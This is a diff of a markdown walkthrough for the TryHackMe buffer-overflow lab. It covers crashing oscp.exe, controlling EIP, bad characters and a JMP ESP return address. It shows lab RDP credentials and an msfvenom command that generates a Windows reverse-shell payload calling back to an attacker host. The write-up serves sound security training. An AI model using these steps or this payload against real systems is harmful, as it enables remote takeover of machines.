@@ -2,7 +2,9 @@
 
 **Room Link:** [https://tryhackme.com/room/bufferoverflowprep](https://tryhackme.com/room/bufferoverflowprep)
 
-### Scripts
+
+
+## oscp.exe - OVERFLOW1
 
 #### fuzzer.py
 
@@ -80,10 +82,6 @@ except:
     sys.exit()
 ```
 
-## Challenges
-
-### oscp.exe - OVERFLOW1
-
 **Kali**
 
 Login the the Windows box then open the oscp.exe within Immunity Debugger. Press the play button to start the program.
@@ -92,13 +90,11 @@ Login the the Windows box then open the oscp.exe within Immunity Debugger. Press
 xfreerdp /u:admin /p:password /cert:ignore /v:$VICTIM /workarea
 ```
 
-<figure><img src="../../.gitbook/assets/image (7).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image.png" alt=""><figcaption></figcaption></figure>
 
+<figure><img src="../../.gitbook/assets/image (1).png" alt=""><figcaption></figcaption></figure>
 
-
-#### **Crash Replication & Controlling EIP**
-
-
+### **Crash Replication & Controlling EIP**
 
 Program crashed at 2000 bytes with fuzzer.py
 
@@ -110,9 +106,7 @@ Program crashed at 2000 bytes with fuzzer.py
 
 
 
-
-
-**exploit.py - Cxode Changes #1**
+#### **exploit.py - Code Changes #1**
 
 I added the pattern\_create output into the payload variable.
 
@@ -164,7 +158,7 @@ python exploit.py $VICTIM 1337
 
 
 
-<figure><img src="../../.gitbook/assets/image.png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (50).png" alt=""><figcaption></figcaption></figure>
 
 
 
@@ -210,7 +204,7 @@ python exploit.py $VICTIM 1337
 
 <figure><img src="../../.gitbook/assets/image (6).png" alt=""><figcaption></figcaption></figure>
 
-#### Finding Bad Characters
+### Finding Bad Characters
 
 **Kali**
 
@@ -286,7 +280,7 @@ except:
 
 
 
-#### Finding a Jump Point
+### Finding a Jump Point
 
 Now we need to find a place to jump to to run our payload.  We find there is only one place that will meets our conditions that we need which is an address with  SafeSEH, ASLR, and NXCompat disabled and the  memory address doesn't start with 0x00. ex: 0x0040000 won't work, 0x100000 will work. essfunc.dll meets this criteria.&#x20;
 
@@ -310,15 +304,13 @@ We find that essfunc.dll has 9 possible JMP ESPs to use. So we will start with t
 
 
 
-#### Exploit
+### Exploit
 
 Now that we have the return address to use, we just need to generate our payload without using the bad characters found previously. I also added 16 NOPs before the payload as suggested in the room. All that is left is to  &#x20;
 
 ```
 msfvenom -p windows/shell_reverse_tcp LHOST=$KALI LPORT=4444 EXITFUNC=thread -b "\x00\x07\x2e\xa0" -f c
 ```
-
-****
 
 #### **exploit.py - Code Changes #3**
 
